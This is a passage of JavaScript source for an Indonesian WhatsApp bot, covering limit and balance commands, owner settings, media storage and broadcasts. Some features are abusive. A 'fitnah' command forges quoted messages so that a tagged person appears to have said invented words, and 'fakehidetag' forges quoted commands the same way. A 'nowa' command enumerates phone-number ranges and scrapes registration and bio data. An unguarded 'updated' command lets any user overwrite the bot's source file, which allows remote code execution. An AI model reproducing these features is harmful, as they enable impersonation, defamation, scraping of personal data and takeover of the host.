if (!args[1]) return m.reply(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (isNaN(args[1])) return m.reply(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (args[1] === 'infinity') return m.reply(`Yahaha saya ndak bisa di tipu`)
if (args[1].includes("-")) return m.reply(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6285600793871 2000`)
addCountCmd('transfer', m.sender, _cmd)
giveLimit(users, parseInt(args[1]), limit)
juna.sendTextWithMentions(m.chat, `Sukses top up limit sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)
}
break
case'addglimit': case 'addgamelimit': {
if (!isCreator) return m.reply('Lu Siapa Kocak?')
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6285600793871 2000`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!users) return m.reply(`Tag orang yang ingin di top up game limit\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (!args[1]) return m.reply(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (isNaN(args[1])) return m.reply(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (args[1] === 'infinity') return m.reply(`Yahaha saya ndak bisa di tipu`)
if (args[1].includes("-")) return m.reply(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6285600793871 2000`)
addCountCmd('transfer', m.sender, _cmd)
givegame(users, parseInt(args[1]), glimit)
juna.sendTextWithMentions(m.chat, `Sukses top up game limit sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)
}
break
case'limit': case'balance': case'ceklimit': case'cekbalance':{
/*let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users){
var Ystatus = ownerNumber.includes(users)
var isPrim = Ystatus ? true : _prem.checkPremiumUser(users, premium)
var ggcount = isPrim ? gcounti.prem : gcounti.user
var limitMen = `${getLimit(users, limitCount, limit)}`
reply(`💳 Limit : ${_prem.checkPremiumUser(users, premium) ? 'Unlimited' : limitMen}/${limitCount}\n🕹️ Limit Game : ${cekGLimit(users, ggcount, glimit)}/${ggcount}\n🏦 Balance : Rp ${await getBalance(users, balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit *jumlah* dan ${prefix}buyglimit *jumlah* untuk membeli game limit\n\n*Contoh :*\n${prefix}buylimit 1\n${prefix}buyglimit 1\n\n*Catatan :*\n• Harga 1 limit = $50 balance`)
} else {*/
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.sender
var mybal = getBalance(users, balance)
var boal = 'Bronze 1'
if (mybal <= 2) {
boal = 'Bronze 1'
} else if (mybal <= 250) {
boal = 'Bronze 2'
} else if (mybal <= 300) {
boal = 'Bronze 3'
} else if (mybal <= 1000) {
boal = 'Silver 1'
} else if (mybal <= 2000) {
boal = 'Silver 2'
} else if (mybal <= 3000) {
boal = 'Silver 3'
} else if (mybal <= 5000) {
boal = 'Gold 1'
} else if (mybal <= 6000) {
boal = 'Gold 2'
} else if (mybal <= 7000) {
boal = 'Gold 3'
} else if (mybal <= 9000) {
boal = 'Platinum 1'
} else if (mybal <= 10000) {
boal = 'Platinum 2'
} else if (mybal <= 11000) {
boal = 'Platinum 3'
} else if (mybal <= 12000) {
boal = 'Platinum 4'
} else if (mybal <= 13000) {
boal = 'Platinum 5'
} else if (mybal <= 16000) {
boal = 'Diamond 1'
} else if (mybal <= 17000) {
boal = 'Diamond 2'
} else if (mybal <= 18000) {
boal = 'Diamond 3'
} else if (mybal <= 19000) {
boal = 'Diamond 4'
} else if (mybal <= 20000) {
boal = 'Diamond 5'
} else if (mybal <= 30000) {
boal = 'Master'
} else if (mybal <= 40000) {
boal = 'Master ✩'
} else if (mybal <= 50000) {
boal = 'Master ✩✩'
} else if (mybal <= 60000) {
boal = 'Master ✩✩✩'
} else if (mybal <= 70000) {
boal = 'Master ✯'
} else if (mybal <= 80000) {
boal = 'Master ✯✯'
} else if (mybal <= 100000) {
boal = 'Master ✯✯✯'
} else if (mybal <= 110000) {
boal = 'GrandMaster'
} else if (mybal <= 120000) {
boal = 'GrandMaster ✩'
} else if (mybal <= 130000) {
boal = 'GrandMaster ✩✩'
} else if (mybal <= 140000) {
boal = 'GrandMaster ✩✩✩'
} else if (mybal <= 150000) {
boal = 'GrandMaster ✯'
} else if (mybal <= 160000) {
boal = 'GrandMaster ✯✯'
} else if (mybal <= 170000) {
boal = 'GrandMaster ✯✯✯'
} else if (mybal <= 2100000000) {
boal = 'KING SEPUHHH 숒'
} else if (mybal <= 10000000000) {
boal = 'OWNER 🤖'
}
const _pre = require("./lib/premium");
let premiu = JSON.parse(fs.readFileSync('./database/premium.json'));
const isCreato = [botNumber, ...ownerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(users)
const isPremi = _pre.checkPremiumUser(users, premiu)
const gcountop = isPremi ? gcounti.prem : gcounti.user
var limitPrib = `${getLimit(users, limitCount, limit)}`
var teke = `*PROFIL +${users.split('@')[0]}*\n\n👤 Status : ${isCreato ? "🤴 Developer" : isPremi ? '👑 VIP User 👑' : "Free User"}\n💳 Limit : ${isPremi ? 'Unlimited' : limitPrib}\n🕹️ Limit Game : ${cekGLimit(users, gcountop, glimit)}\n🏦 Balance : Rp ${mybal}\n🛡️ Pangkat : ${boal}\n\nKamu dapat membeli limit dengan ${prefix}buylimit *jumlah* dan ${prefix}buyglimit *jumlah* untuk membeli game limit\n\n*Contoh :*\n${prefix}buylimit 1\n${prefix}buyglimit 1\n\n*Catatan :*\n• Harga 1 limit = Rp 250 balance\n\n*Free Balance :*\n${prefix}daftar\n${prefix}mingguan\n${prefix}bulanan`
juna.relayMessage(m.chat,  {
    requestPaymentMessage: {
      currencyCodeIso4217: 'IDR',
      amount1000: `${mybal}000`,
      requestFrom: '0@s.whatsapp.net',
      noteMessage: {
      extendedTextMessage: {
      text: teke,
      contextInfo: {
      externalAdReply: {
      showAdAttribution: true
      }}}}}}, {})
      }
break
// Baileys
case'fitnah':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!text) return juna.sendTextWithMentions(m.chat, `Gunakan dengan cara ${prefix+command} *@tag|pesantarget|pesanbot*\n\n_Contoh_\n\n${prefix+command} @${m.sender.split("@")[0]}|enak ga semalem|enak banget`, m)
var org = text.split("|")[0]
var target = text.split("|")[1];
var bot = text.split("|")[2];
if (!org.startsWith('@')) return m.reply('Tag orangnya')
if (!target) return m.reply(`Masukkan pesan target!`)
if (!bot) return m.reply(`Masukkan pesan bot!`)
var mens = parseMention(target)
addCountCmd('fitnah', m.sender, _cmd)
var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { extemdedTextMessage: { text: `${target}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { conversation: `${target}` }}
juna.sendMessage(m.chat, { text: bot, mentions: mens }, { quoted: mens.length > 2 ? msg1 : msg2 })
break
case'nowa':
if (!isPremium) return m.reply(mess.OnlyPrem)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *nomor*\n\n_Contoh_\n\n${prefix+command} 628XXXXXXXXXX`)
if (text.includes('x')) return m.reply('Misal 6285xxx')
m.reply(mess.wait)
addCountCmd('nowa', m.sender, _cmd)
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = teks.split('x')[0]
var nomer1 = teks.split('x')[countInstances(teks, 'x')] ? teks.split('x')[countInstances(teks, 'x')] : ''
var random_length = countInstances(teks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}

var nomerny = `List Nomer\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`

for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]

var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}

var anu = await juna.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false

try {
try {
var anu1 = await juna.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
} else {
if (random_length == 6) {
var thn = `${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}`
if (thn.endsWith('2009')) {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBio Name : ${anu1.status}\nTahun : ${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}\n\n`
console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
}
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBio Name : ${anu1.status}\nTahun : ${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}\n\n`
console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
}
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [NOT REGISTERED]`, 'red'))
}
}
m.reply(`${nomerny}${no_bio}${no_watsap}`)
break
case 'q': case 'quoted': {
if (!m.quoted) return m.reply('Reply Pesannya!!')
let gwm = await juna.serializeM(await m.getQuotedObj())
if (!gwm.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
await gwm.quoted.copyNForward(m.chat, true)
}
break
case 'fakehidetag':
if (!isPremium) return rely(mess.OnlyPrem)
if (!m.isGroup) return m.reply(mess.OnlyGrup)
if (!text) return juna.sendTextWithMentions(m.chat, `Gunakan dengan cara ${prefix + command} *@tag|text*\n\n_Contoh_\n\n${prefix + command} @${m.sender.split("@")[0]}|Halo`, m)
var org = text.split("|")[0]
var teks = text.split("|")[1];
if (!org.startsWith('@')) return m.reply('Tag orangnya')
var mem2 = []
groupMembers.map( i => mem2.push(i.id) )
var mens = parseMention(target)
addCountCmd('fakehidetag', m.sender, _cmd)
var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { extemdedTextMessage: { text: `${prefix}hidetag ${teks}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { conversation: `${prefix}hidetag ${teks}` }}
juna.sendMessage(m.chat, { text: teks ? teks : '', mentions: mem2 }, { quoted: mens.length > 2 ? msg1 : msg2 })
break
case'react':
if (!isPremium) return rely(mess.OnlyPrem)
if (!m.quoted) return m.reply(`Balas pesannya`)
if (!text) return m.reply(`Masukkan 1 emoji`)
if (!isEmoji(text)) return m.reply(`Itu bukan emoji!`)
if (isEmoji(text).length > 1) return m.reply(`Satu aja emojinya`)
addCountCmd('react', m.sender, _cmd)
var reactMsg = { reactionMessage: {
key: {
remoteJid: m.chat,
fromMe: m.key.fromMe,
id: quoted.id
},
text: text
}
}
juna.sendMessageFromContent(m.chat, reactMsg)
break
case 'setcmd': case 'addcmd':{
if (!m.quoted) return m.reply( 'Reply Pesan!')
if (!m.quoted.fileSha256) return m.reply ('SHA256 Hash Missing')
if (!text) return m.reply(`Contoh ${prefix + command} .menu`)
let hash = m.quoted.fileSha256.toString('base64')
if (db.data.sticker[hash] && db.data.sticker[hash].locked) return m.reply( 'You have no permission to change this sticker command')
db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
m.reply(`Done!`)
}
break
case 'delcmd': {
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) return m.reply ('SHA256 Hash Missing')
if (db.data.sticker[hash] && db.data.sticker[hash].locked) return m.reply( 'You have no permission to change this sticker command')
delete db.data.sticker[hash]
m.reply(`Done!`)
}
break
// Owners Menu
case 'listgc': {
if (!isCreator) return m.reply('Lu Siapa Kocak?')
let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `*Group Chat*
Total: ${anulistg.length} Group\n\n`
for (let i of anulistg) {
let metadata = await juna.groupMetadata(i)
teks += `*Name :* ${metadata.subject}
*Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}
*ID :* ${metadata.id}
*Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}
*Member :* ${metadata.participants.length}\n\n──────────────\n\n`
}
juna.sendTextWithMentions(m.chat, teks, m)
}
break
case 'listpc': {
if (!isCreator) return m.reply('Lu Siapa Kocak?')
let anulistg = await store.chats.all().filter(v => v.id.endsWith('@s.whatsapp.net')).map(v => v.id)
let teks = `*Personal Chat*
Total: ${anulistg.length} Chat\n\n`
for (let i of anulistg) {
teks += `*User :* @${i.split('@')[0]}\n*Chat :* https://wa.me/${i.split('@')[0]}\n\n──────────────\n\n`
}
juna.sendTextWithMentions(m.chat, teks, m)
}
break
case 'joingc': case'join': {
if (!isCreator) return m.reply(`Mau sewa bot buat jaga gc? silahkan hubungi owner`)
if (!text) return m.reply(`Kirim perintah ${prefix + command} _linkgrup_`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.reply(mess.error.Iv)
m.reply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await juna.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'leavegc': {
if (!isCreator) return m.reply(mess.OnlyOwner)
await juna.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'public': {
if (!isCreator) return m.reply(mess.OnlyOwner)
juna.public = true
m.reply('Sukses Change To Public Mode')
}
break
case 'ban': case 'banned': {
if (!isCreator) return m.reply(mess.OnlyOwner)
try {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
banned.push(users)
fs.writeFileSync('./database/banned.json', JSON.stringify(banned, null, 2))
m.reply(`Succes banned @${users.split('@')[0]}`)
} catch (err) {
m.reply(`Tag/Reply Target Yang Mau Di Banned`)
}
}
break
case 'unban': case 'unbanned': {
if (!isCreator) return m.reply(mess.OnlyOwner)
try {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let anu = banned.indexOf(users)
banned.splice(anu, 1)
fs.writeFileSync('./database/banned.json', JSON.stringify(banned, null, 2))
m.reply(`Succes Unbanned @${users.split('@')[0]}`)
} catch (err) {
m.reply(`Tag/Reply Target Yang Mau Di Un-Banned`)
}
}
break
case 'updated': {
if (!/js/.test(mime)) return m.reply(`Reply File *junn.js* Untuk Di-update!`)
let media = await juna.downloadMediaMessage(quoted)
fs.writeFileSync(`./junn.js`, media)
}
break
case 'self': {
if (!isCreator) return m.reply(mess.OnlyOwner)
juna.public = false
m.reply('Sukses Change To Self Mode')
}
break
case 'block': case 'blok':
if (!isCreator) return m.reply(mess.OnlyOwner) 
if (!text) return m.reply(`Masukkan nomor target!`)
let blok = q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
juna.updateBlockStatus(blok, 'block')
m.reply(`Sukses block @${blok.split('@')[0]}`)
break
case 'unblock': case 'unblok':
if (!isCreator) return m.reply(mess.OnlyOwner) 
if (!text) return m.reply(`Masukkan nomor target!`)
let unblok = q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
juna.updateBlockStatus(unblok, 'unblock')
m.reply(`Sukses unblock @${unblok.split('@')[0]}`)
break
case 'listblock': case 'listblok':
let listblok = await juna.fetchBlocklist()
m.reply('*LIST BLOCK*\n' + `Total: ${listblok == undefined ? '*0* Diblokir' : '*' + listblok.length + '* Diblokir'}\n\n` + listblok.map(v => '» @' + v.replace(/@.+/, '')).join`\n`)
break
case 'sampah':
if (!isCreator) return m.reply(mess.OnlyOwner)
let all = await fs.readdirSync('./sticker')
var teks = `JUMLAH SAMPAH SYSTEM\n\n`
teks += `Total : ${all.filter(v => v.endsWith("gif") || v.endsWith("png") || v.endsWith("mp3") || v.endsWith("mp4") || v.endsWith("jpg") || v.endsWith("jpeg") || v.endsWith("webp") || v.endsWith("webm") ).map(v=>v).length} Sampah\n\n`
teks += all.filter(v => v.endsWith("gif") || v.endsWith("png") || v.endsWith("mp3") || v.endsWith("mp4") || v.endsWith("jpg") || v.endsWith("jpeg") || v.endsWith("webp") || v.endsWith("webm") ).map(o=>`${o}\n`).join("");
m.reply(teks)
break
case 'sendpc': {
if (!q) return m.reply(`Contoh: ${prefix+command} 628572562726|halo`)
var no = text.split('|')[0]
var cet = text.split('|')[1]
if (isNaN(no)) return m.reply(`Nomor harus berupa angka!`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : no.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
try {
await juna.sendText(`${users}`, `${cet}`, fbot)
} catch (e) {
m.reply('Terjadi Kesalahan')
}
}
break
case 'sendgc': {
if (!q) return m.reply(`Contoh: ${prefix+command} 122646754757754|halo`)
var no = text.split('|')[0]
var cet = text.split('|')[1]
if (isNaN(no)) return m.reply(`ID grup harus berupa angka!`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : no.replace(/[^0-9]/g, '')+'@g.us'
try {
await juna.sendText(`${users}`, `${cet}`, fbot)
} catch (e) {
m.reply('Terjadi Kesalahan')
}
}
break
case 'delsampah':{
if (!isCreator) return m.reply(mess.OnlyOwner)
let directoryPath = path.join('./sticker') //&& './media') //path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return m.reply('Tidak dapat memindai direktori: ' + err);
} 
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm")  )
var teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return m.reply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})
m.reply(teks)
await sleep(2000)
m.reply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./sticker/${file}`) //&& `./media/${file}`) 
});
await sleep(2000)
m.reply("Berhasil menghapus semua sampah")
});
}
break
case 'sampah2':
if (!isCreator) return m.reply(mess.OnlyOwner)
let fl = await fs.readdirSync('./')
var teks = `JUMLAH SAMPAH SYSTEM\n\n`
teks += `Total : ${all.filter(v => v.endsWith("mp3")).map(v=>v).length} Sampah\n\n`
teks += fl.filter(v => v.endsWith("mp3")).map(o=>`${o}\n`).join("");
m.reply(teks)
break
case 'delsampah2':{
if (!isCreator) return m.reply(mess.OnlyOwner)
let directoryPath = path.join('./') //&& './media') //path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return m.reply('Tidak dapat memindai direktori: ' + err);
} 
let filteredArray = await files.filter(item => item.endsWith("mp3"))
var teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return m.reply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})
m.reply(teks)
await sleep(2000)
m.reply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./${file}`) //&& `./media/${file}`) 
});
await sleep(2000)
m.reply("Berhasil menghapus semua sampah")
});
}
break
case 'setppbot': {
if (!isCreator) return m.reply(mess.OnlyOwner)
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await juna.downloadAndSaveMediaMessage(quoted)
await juna.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply("Done")
}
break
case'nsfw':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus admin!')
if (args[0] === 'on') {
if (isNsfw) return m.reply("Udh on di group ini")
_nsfw.push(m.chat)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(_nsfw))
m.reply("Nsfw berhasil di aktifkan di group ini")
} else if (args[0] === 'off') {
if (!isNsfw) return m.reply("Udh off di group ini")
_nsfw.splice(m.chat, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(_nsfw))
m.reply("Nsfw berhasil di nonaktifkan di group ini")
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
 }}
break
case'autobio': {
if (!isCreator) return m.reply(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.autobio === true) return m.reply("Udh on")
setting.autobio = true
m.reply("Autobio berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.autobio === false) return m.reply("Udh off")
setting.autobio = false
m.reply("Autobio berhasil dinonaktifkan")
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
 }}
break
case'gruponly': {
if (!isCreator) return m.reply(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.gruponly === true) return m.reply("Udh on")
setting.gruponly = true
setting.pconly = false
m.reply("Gruponly berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.gruponly === false) return m.reply("Udh off")
setting.gruponly = false
m.reply("Gruponly berhasil dinonaktifkan")
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
 }}
break
case'pconly': {
if (!isCreator) return m.reply(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.pconly === true) return m.reply("Udh on")
setting.pconly = true
setting.gruponly = false
m.reply("PConly berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.pconly === false) return m.reply("Udh off")
setting.pconly = false
m.reply("PConly berhasil dinonaktifkan")
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
 }}
break
case 'anticall': {
if (!isCreator) return m.reply(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.anticall === true) return m.reply("Udh on")
setting.anticall = true
m.reply("Anticall berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.anticall === false) return m.reply("Udh off")
setting.anticall = false
m.reply("Anticall berhasil dinonaktifkan")
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'autorespond': {
if (!isCreator) return m.reply(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.autorespond === true) return m.reply("Udh on")
setting.autorespond = true
m.reply("Autorespond berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.autorespond === false) return m.reply("Udh off")
setting.autorespond = false
m.reply("Autorespond berhasil dinonaktifkan")
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'autoblok': case 'autoblok212': {
if (!isCreator) return m.reply(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.autoblok212 === true) return m.reply("Udh on")
setting.autoblok212 = true
m.reply("Autoblok berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.autoblok212 === false) return m.reply("Udh off")
setting.autoblok212 = false
m.reply("Autoblok berhasil dinonaktifkan")
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
 }}
break
case 'autoread': {
if (!isCreator) return m.reply(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.autoread === true) return m.reply("Udh on")
setting.autoread = true
m.reply("Autoread berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.autoread === false) return m.reply("Udh off")
setting.autoread = false
m.reply("Autoread berhasil dinonaktifkan")
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
 }}
break
case 'addstiker': case 'addsticker': case 'addstik':{
if (!m.key.fromMe && !isCreator) return m.reply(mess.OnlyOwner)
if (!/webp/.test(mime)) return m.reply(`Contoh : ${prefix + command} halo`)
if (!text) return m.reply(`Contoh : ${prefix + command} halo`)
if (text.includes('|')) return m.reply(`Contoh : ${prefix + command} halo`)
let media = await juna.downloadMediaMessage(quoted)
setiker.push(`${text}`)
fs.writeFileSync(`./database/${text}.webp`, media)
fs.writeFileSync('./database/stik.json', JSON.stringify(setiker))
m.reply(`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`)
}
break
case 'liststik': case 'liststiker': case 'liststc':{
teks = '*STICKER LIST :*\n\n'
for (let awokwkwk of setiker) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${setiker.length}*\n\n_Untuk mengambil sticker silahkan kirim pesan sesuai list stiker di atas_`
m.reply(teks)
break
}
case 'addfoto': case 'addimage': case 'addphoto': case 'addimg':{
if (!m.key.fromMe && !isCreator) return m.reply(mess.OnlyOwner)
if (!/image/.test(mime)) return m.reply(`Contoh : ${prefix + command} halo`)
if (!text) return m.reply(`Contoh : ${prefix + command} halo`)
if (text.includes('|')) return m.reply(`Contoh : ${prefix + command} halo`)
let media = await juna.downloadMediaMessage(quoted)
imagenye.push(`${text}`)
fs.writeFileSync(`./database/${text}.jpg`, media)
fs.writeFileSync('./database/image.json', JSON.stringify(imagenye))
m.reply(`Sukses Menambahkan Image\nCek dengan cara ${prefix}listimg`)
}
break
case 'listimage': case 'imagelist': case 'listimg':{
teks = '*IMAGE LIST :*\n\n'
for (let awokwkwk of imagenye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${imagenye.length}*\n\n_Untuk mengambil image silahkan kirim pesan sesuai list image di atas_`
m.reply(teks)
break
}
case 'addvideo': case 'addvidio': case 'addvid':{
if (!m.key.fromMe && !isCreator) return m.reply(mess.OnlyOwner)
if (!/video/.test(mime)) return m.reply(`Contoh : ${prefix + command} halo`)
if ((quoted.msg || quoted).seconds > 31) return m.reply('Maksimal 30 detik')
if (!text) return m.reply(`Contoh : ${prefix + command} halo`)
if (text.includes('|')) return m.reply(`Contoh : ${prefix + command} halo`)
let media = await juna.downloadMediaMessage(quoted)
videonye.push(`${text}`)
fs.writeFileSync(`./database/${text}.mp4`, media)
fs.writeFileSync('./database/video.json', JSON.stringify(videonye))
m.reply(`Sukses Menambahkan Video\nCek dengan cara ${prefix}listvid`)
}
break
case 'videolist': case 'listvidio': case 'listvid': case 'listvideo':{
teks = '*VIDEO LIST :*\n\n'
for (let awokwkwk of videonye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${videonye.length}*\n\n_Untuk mengambil video silahkan kirim pesan sesuai list video di atas_`
m.reply(teks)
break
}
case 'addaud': case 'addaudio': case 'addvn':{
if (!m.key.fromMe && !isCreator) return m.reply(mess.OnlyOwner)
if (!/audio/.test(mime)) return m.reply(`Contoh : ${prefix + command} halo`)
if ((quoted.msg || quoted).seconds > 31) return m.reply('Maksimal 30 detik')
if (!text) return m.reply(`Contoh : ${prefix + command} halo`)
if (text.includes('|')) return m.reply(`Contoh : ${prefix + command} halo`)
let media = await juna.downloadMediaMessage(quoted)
audionye.push(`${text}`)
fs.writeFileSync(`./database/${text}.mp3`, media)
fs.writeFileSync('./database/vn.json', JSON.stringify(audionye))
m.reply(`Sukses Menambahkan Vn / audio \nCek dengan cara ${prefix}listvn`)
}
break
case 'listvn': case 'listaudio':{
teks = '*AUDIO LIST :*\n\n'
for (let awokwkwk of audionye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${audionye.length}*\n\n_Untuk mengambil audio silahkan kirim pesan sesuai list audio di atas_`
m.reply(teks)
break
}
case 'bcimage': case 'bcimg':{
if (!isCreator) return m.reply(mess.OnlyOwner)
if (!text) return m.reply(`Reply foto dengan caption ${prefix + command} Tes`)
if (!/image/.test(mime)) return m.reply(`Reply foto dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await juna.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
juna.sendMessage(apaan, {image: buffer, caption: txt}, {quoted: fkontak})
}
m.reply('Sukses Broadcast')
}
break
case 'bcvideo': case 'bcvid':{
if (!isCreator) return m.reply(mess.OnlyOwner)
if (!text) return m.reply(`Reply video dengan caption ${prefix + command} Tes`)
if (!/video/.test(mime)) return m.reply(`Reply video dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await juna.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
